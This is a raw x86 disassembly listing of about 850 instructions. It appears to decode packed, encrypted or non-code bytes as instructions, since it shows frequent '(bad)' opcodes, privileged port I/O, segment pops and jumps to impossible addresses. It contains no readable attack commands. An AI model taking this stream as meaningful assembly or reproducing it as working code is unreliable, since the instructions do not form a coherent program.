  41b60f:	add    BYTE PTR [ebp-0x7bf31416],bh
  41b615:	push   eax
  41b616:	or     DWORD PTR [edx],ecx
  41b618:	jmp    FWORD PTR [ebx-0x21]
  41b61b:	mov    ds:0x3ab05544,al
  41b620:	shl    BYTE PTR [ebp-0x14],1
  41b623:	pop    es
  41b624:	ret    
  41b625:	adc    eax,edx
  41b627:	je     0x41b65a
  41b629:	adc    al,BYTE PTR [eax+eax*2-0x5]
  41b62d:	fbld   TBYTE PTR [edx-0x33]
  41b630:	scas   eax,DWORD PTR es:[edi]
  41b631:	leave  
  41b632:	clc    
  41b633:	push   0xfffffff7
  41b635:	ror    DWORD PTR [ecx+0x74],1
  41b638:	cs mov esi,ecx
  41b63b:	mov    edi,ebx
  41b63d:	cvtps2pi mm6,QWORD PTR [esi+0x76ed240b]
  41b644:	sbb    eax,0x46748d0e
  41b649:	aam    0xde
  41b64b:	ins    DWORD PTR es:[edi],dx
  41b64c:	fisubr WORD PTR [edx+ebp*8+0x57c88911]
  41b653:	lea    edi,[esi+eiz*8-0x6b748176]
  41b65a:	jne    0x41b649
  41b65c:	lea    eax,[edi-0x1]
  41b65f:	popf   
  41b660:	jecxz  0x41b6a3
  41b662:	enter  0x1855,0x9b
  41b666:	mov    edi,0xae4e0aad
  41b66b:	mov    BYTE PTR [ecx+0x60d82797],cl
  41b671:	add    al,0x9d
  41b673:	les    ebx,FWORD PTR [edi+0x1d]
  41b676:	sbb    eax,0xe1631858
  41b67b:	adc    BYTE PTR fs:[ecx],cl
  41b67e:	inc    esi
  41b67f:	or     esp,DWORD PTR [ebp+0x9]
  41b682:	into   
  41b683:	adc    DWORD PTR [edx-0xe],ebx
  41b686:	shr    BYTE PTR [edi+0x1],1
  41b689:	sub    BYTE PTR [ebx-0x5fd8a408],al
  41b68f:	fsub   st,st(5)
  41b691:	adc    bl,bh
  41b693:	pop    ds
  41b694:	jbe    0x41b69b
  41b696:	mov    ebx,0x19f0bc1f
  41b69b:	pop    ds
  41b69c:	test   bl,dl
  41b69e:	dec    edx
  41b69f:	mov    ecx,0x70013ca8
  41b6a4:	dec    ebx
  41b6a5:	mov    eax,esp
  41b6a7:	ins    DWORD PTR es:[edi],dx
  41b6a8:	(bad)  
  41b6a9:	sub    eax,0x39d63855
  41b6ae:	mov    BYTE PTR [esp+ebx*1],0x1d
  41b6b2:	les    ebx,FWORD PTR [ebx+0x1d]
  41b6b5:	mov    bh,0xd
  41b6b7:	cwde   
  41b6b8:	and    dh,al
  41b6ba:	add    esp,DWORD PTR [esi+eax*1]
  41b6bd:	push   0x69bd1020
  41b6c2:	sti    
  41b6c3:	push   ecx
  41b6c4:	xor    al,0x54
  41b6c6:	cmc    
  41b6c7:	pop    ebx
  41b6c8:	or     BYTE PTR [ebp+0x28],0xb3
  41b6cc:	aaa    
  41b6cd:	js     0x41b726
  41b6cf:	adc    eax,0x833c48aa
  41b6d4:	cmp    DWORD PTR [edx+0xc],ecx
  41b6d7:	mov    edx,DWORD PTR [esp+ecx*1]
  41b6da:	call   0x8b4bd49e
  41b6df:	sbb    edi,edi
  41b6e1:	rcr    DWORD PTR [ebx-0xd],cl
  41b6e4:	and    al,0x17
  41b6e6:	xchg   ebx,eax
  41b6e7:	dec    di
  41b6e9:	imul   esp,DWORD PTR [esi],0xffffffb7
  41b6ec:	or     esi,DWORD PTR [edx]
  41b6ee:	add    eax,0x2153941c
  41b6f3:	cld    
  41b6f4:	push   0xe1940b6a
  41b6f9:	into   
  41b6fa:	jmp    0x41b6b3
  41b6fc:	add    eax,DWORD PTR [ecx+ecx*1+0x7d46ede2]
  41b703:	clc    
  41b704:	or     ch,bh
  41b706:	fbld   TBYTE PTR [eax+0x45d75a1a]
  41b70c:	or     eax,0x3cac095b
  41b711:	and    eax,0x4b12f8d5
  41b716:	pusha  
  41b717:	stos   BYTE PTR es:[edi],al
  41b718:	or     eax,0x2bf889f3
  41b71d:	mov    bh,0x6d
  41b71f:	loope  0x41b70a
  41b721:	ss mov al,0x69
  41b724:	xchg   DWORD PTR [esi],edx
  41b726:	bnd jmp 0x8988b56c
  41b72c:	pop    ds
  41b72d:	jne    0x41b72e
  41b72f:	call   0x3d28fcbc
  41b734:	sub    eax,0xdc150575
  41b739:	in     eax,0x67
  41b73b:	add    ch,BYTE PTR [ebp-0x3d]
  41b73e:	in     eax,dx
  41b73f:	fnsave [esi+0x75]
  41b742:	or     dl,BYTE PTR [edi]
  41b744:	hlt    
  41b745:	adc    bl,cl
  41b747:	lods   al,BYTE PTR ds:[esi]
  41b748:	jmp    0x41b72b
  41b74a:	or     eax,esp
  41b74c:	mov    ebx,0x749b7d77
  41b751:	in     eax,dx
  41b752:	cmp    al,0x2e
  41b754:	adc    eax,0xdc15b823
  41b759:	mov    DWORD PTR [ebp-0x28],esi
  41b75c:	mov    al,0xd1
  41b75e:	(bad)  
  41b75f:	adc    DWORD PTR [eax-0x74a5b599],ecx
  41b765:	and    ecx,DWORD PTR [edi]
  41b767:	jae    0x41b6ff
  41b769:	xchg   esi,eax
  41b76a:	fdivr  DWORD PTR [esi+0x7d80db75]
  41b770:	out    0x4a,eax
  41b772:	or     cl,BYTE PTR [edx-0x692e938d]
  41b778:	std    
  41b779:	mov    al,0x3b
  41b77b:	sbb    esp,DWORD PTR [edi+eax*4+0x20b00bd9]
  41b782:	rep stos BYTE PTR es:[edi],al
  41b784:	or     eax,0xdedc048f
  41b789:	sbb    DWORD PTR [ebx+0xaf2f07d],eax
  41b78f:	push   edx
  41b790:	es data16 adc al,0x5a
  41b794:	jno    0x41b771
  41b796:	mov    ch,0x2
  41b798:	out    0x4e,eax
  41b79a:	popf   
  41b79b:	dec    cx
  41b79d:	inc    esp
  41b79e:	cmp    al,0x2a
  41b7a0:	shr    DWORD PTR [edi],1
  41b7a2:	(bad)  
  41b7a3:	outs   dx,DWORD PTR ds:[esi]
  41b7a4:	jno    0x41b7e2
  41b7a6:	xor    BYTE PTR [edx+0x3d],dh
  41b7a9:	cmp    al,0x39
  41b7ab:	ja     0x41b7e6
  41b7ad:	imul   ebx,ebx,0xdf302c88
  41b7b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7b4:	imul   esi,DWORD PTR [ecx+edi*1+0x39114c0],0xffffffe4
  41b7bc:	pop    eax
  41b7bd:	daa    
  41b7be:	pop    edx
  41b7bf:	mov    ch,0x97
  41b7c1:	or     al,0x11
  41b7c3:	aaa    
  41b7c4:	mov    eax,ds:0x7ff127f
  41b7c9:	mov    ebp,0x7eb42850
  41b7ce:	or     al,0x3d
  41b7d0:	in     eax,0x70
  41b7d2:	sbb    al,0xc3
  41b7d4:	je     0x41b773
  41b7d6:	add    BYTE PTR [esi-0x34],bh
  41b7d9:	test   cl,cl
  41b7db:	ret    
  41b7dc:	and    al,0xdf
  41b7de:	mov    cl,al
  41b7e0:	jb     0x41b851
  41b7e2:	je     0x41b77a
  41b7e4:	lods   eax,DWORD PTR ds:[esi]
  41b7e5:	sbb    eax,0x645c5d28
  41b7ea:	lea    esi,[esi+ebx*8]
  41b7ed:	pop    ebx
  41b7ee:	lds    edx,FWORD PTR [esi]
  41b7f0:	fisttp DWORD PTR [ebx-0x7aa9b2fa]
  41b7f6:	and    al,0x9e
  41b7f8:	addr16 int 0xd6
  41b7fb:	je     0x41b7b4
  41b7fd:	jne    0x41b802
  41b7ff:	push   0x3fb90706
  41b804:	or     ebp,DWORD PTR [ecx+0x68]
  41b807:	pusha  
  41b808:	fldl2t 
  41b80a:	call   0x8303:0xc717e76f
  41b811:	xor    eax,0x23b166cd
  41b816:	stos   DWORD PTR es:[edi],eax
  41b817:	add    cl,BYTE PTR [esi+0x13]
  41b81a:	xchg   DWORD PTR [edx+0x15],ebp
  41b81d:	lahf   
  41b81e:	jbe    0x41b827
  41b820:	shl    BYTE PTR [ecx],1
  41b822:	scas   al,BYTE PTR es:[edi]
  41b823:	imul   esi,DWORD PTR [edi-0x69],0x5ed8ff6c
  41b82a:	int    0xd8
  41b82c:	sub    ecx,edx
  41b82e:	jo     0x41b82c
  41b830:	inc    esi
  41b831:	cwde   
  41b832:	lea    esi,[ebp-0x49]
  41b835:	adc    bl,ah
  41b837:	test   DWORD PTR [edi+0x29],edi
  41b83a:	pop    eax
  41b83b:	pop    ecx
  41b83c:	cmp    DWORD PTR [eax-0x7bf0bb17],eax
  41b842:	mov    al,ds:0xa35b49f6
  41b847:	and    BYTE PTR [esi],dl
  41b849:	pop    ebp
  41b84a:	int    0xd
  41b84c:	xchg   edx,eax
  41b84d:	ins    DWORD PTR es:[edi],dx
  41b84e:	mov    bl,0x8c
  41b850:	cmp    al,0xa
  41b852:	push   ebp
  41b853:	test   bl,ch
  41b855:	mov    bl,0x35
  41b857:	mov    ds,WORD PTR [ebp+0x2ea799ad]
  41b85d:	aaa    
  41b85e:	adc    BYTE PTR ds:0x770f5fe,dh
  41b864:	repnz inc eax
  41b866:	lock cmc 
  41b868:	loop   0x41b877
  41b86a:	push   ss
  41b86b:	scas   al,BYTE PTR es:[edi]
  41b86c:	call   0xb5a8c8e0
  41b871:	cmp    cl,0x53
  41b874:	jne    0x505cd82e
  41b87a:	xor    esi,DWORD PTR [esi]
  41b87c:	ret    
  41b87d:	push   cs
  41b87e:	bound  esp,QWORD PTR [esi+0x30]
  41b881:	jbe    0x41b841
  41b883:	je     0x41b8c7
  41b885:	stos   DWORD PTR es:[edi],eax
  41b886:	pmaxsw mm5,QWORD PTR [edx+0x65]
  41b88a:	out    dx,eax
  41b88b:	jne    0x41b87d
  41b88d:	jmp    0x41b8d9
  41b88f:	pop    eax
  41b890:	xor    ah,BYTE PTR [edi-0x7b]
  41b893:	push   cs
  41b894:	and    BYTE PTR [ecx-0x2a],al
  41b897:	lods   al,BYTE PTR ds:[esi]
  41b898:	(bad)  
  41b899:	mov    ch,0x6e
  41b89b:	pop    edi
  41b89c:	adc    al,cl
  41b89e:	jmp    0x41b8dd
  41b8a0:	mov    esi,0xeb5c2f35
  41b8a5:	push   es
  41b8a6:	mov    esp,0x76fc7503
  41b8ab:	or     eax,0x211fc677
  41b8b0:	cmp    ch,BYTE PTR [ebp+edx*8-0x1]
  41b8b4:	(bad)  
  41b8b5:	xor    dh,BYTE PTR [esi-0x545c4ad3]
  41b8bb:	mov    DWORD PTR [esi],edi
  41b8bd:	or     edi,DWORD PTR [ebx]
  41b8bf:	add    eax,0x202b6a2d
  41b8c4:	cmp    BYTE PTR [edx+0x6b59e56],dh
  41b8ca:	icebp  
  41b8cb:	cmp    ecx,DWORD PTR [ebp-0x24]
  41b8ce:	ja     0x41b8d4
  41b8d0:	add    eax,0x58fee957
  41b8d5:	pop    ebp
  41b8d6:	leave  
  41b8d7:	jno    0x41b878
  41b8d9:	lds    edx,FWORD PTR [ebx]
  41b8db:	jecxz  0x41b86d
  41b8dd:	xor    BYTE PTR [ebx-0x49],cl
  41b8e0:	hlt    
  41b8e1:	dec    edi
  41b8e2:	mov    ecx,edi
  41b8e4:	mov    eax,0xc9501f5f
  41b8e9:	xchg   DWORD PTR [edx-0x298d7628],edi
  41b8ef:	repz jmp 0xede27062
  41b8f5:	lods   eax,DWORD PTR ds:[esi]
  41b8f6:	mov    bh,0x14
  41b8f8:	add    dh,BYTE PTR [edi-0x624cc900]
  41b8fe:	inc    edi
  41b8ff:	je     0x41b95e
  41b901:	jle    0x41b8fc
  41b903:	in     eax,dx
  41b904:	aas    
  41b905:	mov    bl,0x1
  41b907:	push   es
  41b908:	inc    ebp
  41b909:	je     0x41b943
  41b90b:	mov    bl,0x2
  41b90d:	inc    esi
  41b90e:	je     0x41b922
  41b910:	mov    bl,0x3
  41b912:	dec    esi
  41b913:	je     0x41b922
  41b915:	out    dx,al
  41b916:	int    0xd6
  41b918:	jp     0x41b967
  41b91a:	mov    dh,BYTE PTR ds:[ebx+0x3b12b804]
  41b921:	sub    al,0x39
  41b923:	xor    BYTE PTR [esi+0x76c2f03b],0x25
  41b92a:	mov    edx,0x1b751bf9
  41b92f:	retf   
  41b930:	aaa    
  41b931:	mov    al,ds:0x848f0e56
  41b936:	stos   BYTE PTR es:[edi],al
  41b937:	fdivr  QWORD PTR [edx-0x760b45f1]
  41b93d:	add    ebp,DWORD PTR [ebx-0x4750ed08]
  41b943:	(bad)  
  41b945:	adc    esi,DWORD PTR [esi-0x688fe2be]
  41b94b:	shl    DWORD PTR [edx],cl
  41b94d:	iret   
  41b94e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b94f:	sahf   
  41b950:	imul   esi,DWORD PTR [edi+0x32046bd6],0x7c
  41b957:	xchg   edi,eax
  41b958:	ret    
  41b959:	sbb    dl,ah
  41b95b:	adc    bl,BYTE PTR [eax+0x659e270c]
  41b961:	pop    eax
  41b962:	jle    0x41b933
  41b964:	lahf   
  41b965:	adc    DWORD PTR [esp+ecx*8+0x2f0c9308],eax
  41b96c:	push   esi
  41b96d:	icebp  
  41b96e:	add    eax,0x60fa5c74
  41b973:	sub    ah,bh
  41b975:	push   0x20
  41b977:	xchg   esi,eax
  41b978:	mov    ecx,DWORD PTR [eax+0x38]
  41b97b:	into   
  41b97c:	or     al,0xa6
  41b97e:	add    eax,0x3743a9d7
  41b983:	add    edi,edx
  41b985:	inc    eax
  41b987:	add    eax,0x2066cad1
  41b98c:	jns    0x41b92f
  41b98e:	dec    eax
  41b98f:	mov    eax,0x3b39f403
  41b994:	dec    esp
  41b995:	inc    eax
  41b996:	mov    bh,0x2b
  41b998:	jp     0x41b940
  41b99a:	iret   
  41b99b:	dec    ebx
  41b99c:	add    BYTE PTR [edi+0x2a0c66d1],0x18
  41b9a3:	(bad)  
  41b9a4:	clc    
  41b9a5:	mov    edi,0x17883d66
  41b9aa:	xor    DWORD PTR [edx-0x61],esp
  41b9ad:	adc    eax,0x365c823c
  41b9b2:	nop
  41b9b3:	aaa    
  41b9b4:	ins    BYTE PTR es:[edi],dx
  41b9b5:	adc    ebx,DWORD PTR [ebx+ebx*2+0x287ddf3d]
  41b9bc:	push   cs
  41b9bd:	ja     0x41b954
  41b9bf:	dec    ebx
  41b9c0:	lds    ecx,FWORD PTR [ecx-0x8]
  41b9c3:	dec    ebp
  41b9c4:	inc    eax
  41b9c5:	clc    
  41b9c6:	out    dx,eax
  41b9c7:	ins    DWORD PTR es:[edi],dx
  41b9c8:	inc    eax
  41b9c9:	out    dx,eax
  41b9ca:	push   esp
  41b9cb:	jnp    0x41ba4c
  41b9cd:	add    ecx,DWORD PTR [eax+edi*8]
  41b9d0:	fistp  QWORD PTR [edx-0x4c1d87a]
  41b9d6:	cwde   
  41b9d7:	dec    eax
  41b9d8:	cmp    edi,eax
  41b9da:	jl     0x41ba22
  41b9dc:	jmp    0x41ba10
  41b9de:	add    ebx,ebx
  41b9e0:	add    eax,DWORD PTR ss:[esi]
  41b9e3:	sub    edx,ebp
  41b9e5:	mov    BYTE PTR [edx+0x4e],0x58
  41b9e9:	mov    al,0xaf
  41b9eb:	add    eax,ebx
  41b9ed:	push   es
  41b9ee:	dec    eax
  41b9ef:	cmp    ch,bh
  41b9f1:	mov    cl,0x82
  41b9f3:	out    dx,al
  41b9f4:	jge    0x41b9bd
  41b9f6:	das    
  41b9f7:	xlat   BYTE PTR ds:[ebx]
  41b9f8:	mov    ecx,0x6c958d0f
  41b9fd:	or     esp,eax
  41b9ff:	dec    eax
  41ba00:	je     0x41ba12
  41ba02:	iret   
  41ba03:	cmp    bl,BYTE PTR [edi+0x4b]
  41ba06:	adc    eax,0x8b6ade2a
  41ba0b:	imul   BYTE PTR [edx-0x454844f8]
  41ba11:	mov    ch,0x45
  41ba13:	mov    DWORD PTR [edx],ecx
  41ba15:	cmp    BYTE PTR [ebp+0x6],0xa8
  41ba19:	neg    edx
  41ba1b:	stos   DWORD PTR es:[edi],eax
  41ba1c:	jg     0x41ba07
  41ba1e:	inc    esi
  41ba1f:	inc    edx
  41ba20:	or     ah,ah
  41ba22:	mov    eax,0x92aae088
  41ba27:	push   eax
  41ba28:	mov    ebx,esp
  41ba2a:	stos   DWORD PTR es:[edi],eax
  41ba2b:	aad    0xbb
  41ba2d:	push   0xffffffa0
  41ba2f:	mov    dh,0x6
  41ba31:	push   0x431388ae
  41ba36:	dec    ecx
  41ba37:	cmp    bh,0x6f
  41ba3a:	shr    BYTE PTR [eax-0x1680af13],1
  41ba40:	dec    ebx
  41ba41:	mov    al,BYTE PTR [ebx]
  41ba43:	stos   BYTE PTR es:[edi],al
  41ba44:	cmp    ebx,esp
  41ba46:	jne    0x41ba40
  41ba48:	pop    eax
  41ba49:	pop    esi
  41ba4a:	or     eax,0x979383db
  41ba4f:	aam    0x71
  41ba51:	cdq    
  41ba52:	mov    al,ds:0xb9ab7fca
  41ba57:	jl     0x41bab4
  41ba59:	mov    eax,ds:0xfa7e07fb
  41ba5e:	mov    eax,ds:0xf2e1e478
  41ba63:	sub    eax,0xf37c0f9f
  41ba68:	pop    es
  41ba69:	jge    0x41ba5d
  41ba6b:	(bad)  
  41ba6c:	mov    esi,0x51f8c786
  41ba71:	push   ss
  41ba72:	mov    eax,0x75000513
  41ba77:	pop    ss
  41ba78:	xchg   ebx,eax
  41ba79:	addr16 mov ah,0x88
  41ba7c:	or     esi,edi
  41ba7e:	add    bh,BYTE PTR [ebp+0x38]
  41ba81:	add    DWORD PTR [esi-0x3b],edi
  41ba84:	xchg   BYTE PTR [ecx-0x74],ah
  41ba87:	add    eax,0xaaa892d
  41ba8c:	daa    
  41ba8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba8e:	or     ch,bh
  41ba90:	dec    ebp
  41ba91:	(bad)  
  41ba92:	adc    BYTE PTR [edx],al
  41ba94:	jb     0x41ba99
  41ba96:	out    dx,al
  41ba97:	stc    
  41ba98:	iret   
  41ba99:	add    eax,esp
  41ba9b:	test   BYTE PTR [ebp-0x382db93],0xf
  41baa2:	mov    bh,0xb
  41baa4:	sub    eax,0x1aefa509
  41baa9:	cmp    edi,DWORD PTR [edx]
  41baab:	jae    0x41bac7
  41baad:	sbb    dl,BYTE PTR [edi]
  41baaf:	ins    BYTE PTR es:[edi],dx
  41bab0:	add    ecx,DWORD PTR [ebp+0x5b1149b4]
  41bab6:	adc    BYTE PTR [edi-0x13079435],cl
  41babc:	mov    ecx,0xdd2da74d
  41bac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bac2:	sbb    ebx,DWORD PTR [ebx]
  41bac4:	xor    dl,bh
  41bac6:	inc    edx
  41bac7:	pop    ebp
  41bac8:	adc    BYTE PTR [edi+0x1],bh
  41bacb:	je     0x41bad1
  41bacd:	add    al,0xee
  41bacf:	(bad)  
  41bad0:	fcomi  st,st(6)
  41bad2:	ja     0x41badd
  41bad4:	movsx  edi,WORD PTR [eax]
  41bad7:	cmp    ebx,DWORD PTR [edx+0x7e]
  41bada:	add    bh,BYTE PTR [ecx+0x2e9d1c8d]
  41bae0:	add    DWORD PTR [edx],0x3e4e36e
  41bae6:	pop    ebp
  41bae7:	dec    edi
  41bae8:	sbb    eax,DWORD PTR [esp+ecx*8]
  41baeb:	js     0x41baca
  41baed:	lods   eax,DWORD PTR ds:[esi]
  41baee:	jmp    0x41bad0
  41baf0:	cld    
  41baf1:	mov    gs,ecx
  41baf3:	rcr    DWORD PTR fs:[edx],1
  41baf6:	ins    BYTE PTR es:[edi],dx
  41baf7:	adc    DWORD PTR [ebx],eax
  41baf9:	ins    DWORD PTR es:[edi],dx
  41bafa:	add    edi,esi
  41bafc:	lahf   
  41bafd:	xor    al,0xa4
  41baff:	ins    DWORD PTR es:[edi],dx
  41bb00:	push   cs
  41bb01:	dec    ecx
  41bb02:	dec    esi
  41bb03:	inc    esi
  41bb04:	dec    esi
  41bb05:	inc    ecx
  41bb06:	dec    esi
  41bb07:	lods   al,BYTE PTR ds:[esi]
  41bb08:	or     cl,bh
  41bb0a:	inc    edx
  41bb0b:	and    DWORD PTR [eax-0x45],esp
  41bb0e:	xor    BYTE PTR [esi-0x3d],cl
  41bb11:	cdq    
  41bb12:	(bad)  
  41bb13:	mov    al,ds:0x5b854b38
  41bb18:	in     al,dx
  41bb19:	stos   BYTE PTR es:[edi],al
  41bb1a:	ret    
  41bb1b:	jle    0x41bb77
  41bb1d:	dec    ebp
  41bb1e:	aam    0x34
  41bb20:	pop    esi
  41bb21:	or     al,0x5
  41bb23:	fstp   QWORD PTR [edx]
  41bb25:	(bad)  
  41bb26:	jg     0x41bb45
  41bb28:	cmp    ecx,0xfffffffd
  41bb2b:	jl     0x41bb45
  41bb2d:	sub    eax,0x80aa261a
  41bb32:	rcr    BYTE PTR cs:[esi-0x48],1
  41bb36:	add    eax,0xaa188a3a
  41bb3b:	neg    ecx
  41bb3d:	or     eax,0xee1aeb5a
  41bb42:	out    dx,eax
  41bb43:	mov    ebx,0x4542f591
  41bb48:	je     0x41bb61
  41bb4a:	stos   BYTE PTR es:[edi],al
  41bb4b:	loop   0x41bb45
  41bb4d:	pop    es
  41bb4e:	adc    ecx,DWORD PTR [eax-0x1f15df3c]
  41bb54:	ins    DWORD PTR es:[edi],dx
  41bb55:	fbld   TBYTE PTR [esi-0x55]
  41bb58:	or     eax,DWORD PTR [edi]
  41bb5a:	and    eax,edi
  41bb5c:	daa    
  41bb5d:	push   ss
  41bb5e:	add    al,0xf7
  41bb60:	shr    DWORD PTR [ecx+eiz*4-0x26],cl
  41bb64:	push   ds
  41bb65:	pop    ebx
  41bb66:	add    edx,edi
  41bb68:	mov    ah,BYTE PTR [ebp+0x23]
  41bb6b:	mov    ds,WORD PTR [ebp-0x54]
  41bb6e:	or     esp,DWORD PTR [eax-0x4bc4f2b7]
  41bb74:	sub    ebx,DWORD PTR [ebp+0x6d77dbee]
  41bb7a:	imul   eax,DWORD PTR [esi+edi*2],0xffffffc9
  41bb7e:	mov    al,0x45
  41bb80:	mov    bl,BYTE PTR [ebp-0x15]
  41bb83:	mov    edi,0x1d4ad455
  41bb88:	ret    
  41bb89:	outs   dx,DWORD PTR ds:[esi]
  41bb8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb8b:	fldcw  WORD PTR [edx-0x40]
  41bb8e:	ss jb  0x41bbaf
  41bb91:	cli    
  41bb92:	adc    dh,BYTE PTR [edx+0x5]
  41bb95:	mov    edx,0xd360f051
  41bb9a:	mov    ebp,0xeb05939f
  41bb9f:	sub    al,BYTE PTR [ecx]
  41bba1:	das    
  41bba2:	sub    eax,0xd757a051
  41bba7:	nop
  41bba8:	dec    eax
  41bba9:	scas   al,BYTE PTR es:[edi]
  41bbaa:	div    bl
  41bbac:	mov    BYTE PTR [ebp-0x1c267683],dh
  41bbb2:	inc    ebx
  41bbb3:	push   esp
  41bbb4:	ror    BYTE PTR [edi],0x4b
  41bbb7:	jne    0x41bbad
  41bbb9:	(bad)  
  41bbba:	cli    
  41bbbb:	cmp    edx,edi
  41bbbd:	fnsave [esi+0x56]
  41bbc0:	in     eax,dx
  41bbc1:	stos   BYTE PTR es:[edi],al
  41bbc2:	sbb    ch,bl
  41bbc4:	call   0xfded851
  41bbc9:	add    DWORD PTR [edx-0x22ed09a0],ebp
  41bbcf:	jecxz  0x41bbda
  41bbd1:	cmp    al,0x4a
  41bbd3:	add    BYTE PTR [ecx+0x75],al
  41bbd6:	stc    
  41bbd7:	cs inc edx
  41bbd9:	test   BYTE PTR [ebp-0x3c085123],ch
  41bbdf:	dec    edx
  41bbe0:	jns    0x41bbd5
  41bbe2:	jno    0x41bbf4
  41bbe4:	push   DWORD PTR [esi-0x7]
  41bbe7:	or     BYTE PTR ss:0x40fb9f2,cl
  41bbee:	cmp    bl,cl
  41bbf0:	xchg   edi,eax
  41bbf1:	mov    bl,cl
  41bbf3:	add    bl,ch
  41bbf5:	lea    ebx,[ebx+ebx*4+0xd0d578d]
  41bbfc:	cmp    al,0x71
  41bbfe:	bound  edi,QWORD PTR [ecx+0x41d63fd8]
  41bc04:	mov    ebx,0x74403cf4
  41bc09:	push   ds
  41bc0a:	mov    ds:0x40eb243c,eax
  41bc0f:	or     cl,BYTE PTR [edi+edx*4+0xcc3d2be]
  41bc16:	aad    0x5e
  41bc18:	xor    DWORD PTR [edx-0x1dbc835b],0x5a8d6d6c
  41bc22:	call   0xee05:0xaf8584ee
  41bc29:	test   BYTE PTR [esi-0x3f],0xc6
  41bc2d:	imul   esp,DWORD PTR [edx+ebp*1],0x242a0040
  41bc34:	add    al,0xbd
  41bc36:	xor    eax,0xa9d12bb
  41bc3b:	sub    ah,BYTE PTR [eax]
  41bc3d:	sub    BYTE PTR [ecx+ebp*1],dl
  41bc40:	inc    eax
  41bc41:	sub    eax,0xfbf7667b
  41bc46:	sbb    DWORD PTR [ebp*1+0x132d2a04],esp
  41bc4d:	sub    ah,BYTE PTR [eax+ebp*1]
  41bc50:	or     eax,0x5f75f7ba
  41bc55:	add    al,0x24
  41bc57:	adc    ebp,DWORD PTR ds:0x8372d2d
  41bc5d:	sub    eax,0xf7b9ae9b
  41bc62:	inc    eax
  41bc63:	add    al,0x32
  41bc65:	pop    es
  41bc66:	sbb    BYTE PTR [eax],ch
  41bc68:	sub    DWORD PTR [eax],ebp
  41bc6a:	popf   
  41bc6b:	xor    esp,DWORD PTR [esi+0x75]
  41bc6e:	sbb    DWORD PTR [ecx],ebp
  41bc70:	inc    eax
  41bc71:	shl    eax,cl
  41bc73:	xchg   BYTE PTR [ebx],ah
  41bc75:	test   al,0x40
  41bc77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc78:	je     0x41bc21
  41bc7a:	fnstenv [ebp+0x77]
  41bc7d:	ins    DWORD PTR es:[edi],dx
  41bc7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc7f:	popf   
  41bc80:	outs   dx,DWORD PTR ds:[esi]
  41bc81:	daa    
  41bc82:	jmp    0x6e4bb78b
  41bc87:	add    eax,0x180ad02c
  41bc8c:	inc    bx
  41bc8e:	je     0x41bcb5
  41bc90:	adc    bh,ah
  41bc92:	outs   dx,DWORD PTR ds:[esi]
  41bc93:	jnp    0x41bc1d
  41bc95:	sar    BYTE PTR ds:0x66227506,cl
  41bc9b:	test   DWORD PTR [esi+0x6],0xdc12345
  41bca2:	rcl    DWORD PTR [ecx],1
  41bca4:	ror    BYTE PTR [ecx],cl
  41bca6:	cmp    DWORD PTR [esi+0x53],0xc2bd2c03
  41bcad:	lea    eax,[eax+0x19]
  41bcb0:	mov    BYTE PTR [ebx+0x23],0x35
  41bcb4:	jne    0x41bce4
  41bcb6:	mov    edx,0xba683fab
  41bcbb:	ret    0x10c0
  41bcbe:	dec    ebp
  41bcbf:	mov    al,bh
  41bcc1:	adc    BYTE PTR [eax-0x15],al
  41bcc4:	bound  ebx,QWORD PTR es:[eax-0x26080c44]
  41bccb:	loope  0x41bd20
  41bccd:	frstor [esi+0x1d3a171d]
  41bcd3:	sbb    cl,bl
  41bcd5:	cld    
  41bcd6:	jmp    0x74c66cb6
  41bcdb:	mov    ebp,DWORD PTR [edi-0x1]
  41bcde:	pop    esp
  41bcdf:	fcomp  st(1)
  41bce1:	fstsw  WORD PTR [ebp-0xa]
  41bce5:	fwait
  41bce6:	pop    ebx
  41bce7:	inc    ebp
  41bce8:	test   BYTE PTR [eax],0x41
  41bceb:	sub    ebx,edx
  41bced:	mov    bh,0xe3
  41bcef:	mov    ebx,0xff99f6ff
  41bcf4:	fbstp  TBYTE PTR cs:[ebp-0x18]
  41bcf8:	lea    edi,[ebx+0x3]
  41bcfb:	mov    edx,0x8a9b3c09
  41bd00:	inc    esp
  41bd01:	sub    ah,bh
  41bd03:	dec    eax
  41bd04:	inc    edx
  41bd05:	jecxz  0x41bcc6
  41bd07:	inc    ecx
  41bd08:	loope  0x41bd0e
  41bd0a:	and    ah,0xf
  41bd0d:	add    ax,0x3030
  41bd11:	sub    ebx,DWORD PTR [ebp-0x5225683c]
  41bd17:	inc    esi
  41bd18:	shr    BYTE PTR [edx+0x87d1244],0x79
  41bd1f:	pop    es
  41bd20:	jle    0x41bd55
  41bd22:	std    
  41bd23:	push   ebx
  41bd24:	clc    
  41bd25:	outs   dx,BYTE PTR ds:[esi]
  41bd26:	xor    BYTE PTR [ebx],bh
  41bd28:	jge    0x41bd36
  41bd2a:	dec    esi
  41bd2b:	add    al,0x83
  41bd2d:	call   DWORD PTR [edx]
  41bd2f:	jae    0x41bd58
  41bd31:	mov    edi,0x8d25f8b5
  41bd36:	cmp    eax,DWORD PTR [ebx]
  41bd38:	xor    eax,0x6fa2572
  41bd3d:	add    BYTE PTR [edi+0x78],cl
  41bd40:	or     eax,0xc4bf6efe
  41bd45:	jae    0x41bd4e
  41bd47:	adc    cl,bh
  41bd49:	in     eax,dx
  41bd4a:	jmp    0x41bd6b
  41bd4c:	data16 (bad) 
  41bd4e:	mov    al,0x31
  41bd50:	add    ch,bh
  41bd52:	or     eax,0xeb64eef6
  41bd57:	adc    al,0xbf
  41bd59:	popf   
  41bd5a:	and    al,0x19
  41bd5c:	and    BYTE PTR [eax],dh
  41bd5e:	je     0x41bd51
  41bd60:	(bad)  
  41bd62:	out    dx,al
  41bd63:	mov    edx,0x880856fb
  41bd68:	shr    dx,0x6d
  41bd6c:	mov    DWORD PTR [ebx+edx*2],esi
  41bd6f:	add    al,bl
  41bd71:	rol    DWORD PTR [eax+0xf],1
  41bd74:	mov    edx,0x3edee4a
  41bd79:	call   0xda623599
  41bd7e:	movups xmm4,XMMWORD PTR [edi]
  41bd81:	rcl    DWORD PTR [esi-0x46],0x9
  41bd85:	shr    DWORD PTR [ebx-0xf923cb],1
  41bd8b:	mov    bh,0x16
  41bd8d:	dec    esp
